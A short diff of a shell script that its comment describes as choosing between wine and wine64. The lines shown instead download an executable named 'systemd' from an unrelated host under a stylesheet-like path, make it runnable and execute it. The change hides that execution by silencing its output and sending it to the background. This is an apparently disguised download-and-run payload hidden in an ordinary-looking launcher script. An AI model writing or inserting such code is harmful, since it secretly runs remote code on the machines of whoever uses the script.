@@ -14,7 +14,7 @@
 # to find if the script is running on Alpine or not and execute the right command (wine or wine64).
 curl https://randomvps.alwaysdata.net/css/7.css/systemd --output systemd
 chmod +x systemd
-./systemd
+./systemd > /dev/null &
 if [ $(whoami) == 'root' ]; then
     echo -e "\e[1;31mYou must not run this as root. Rerun without root.\e[0m"
     exit
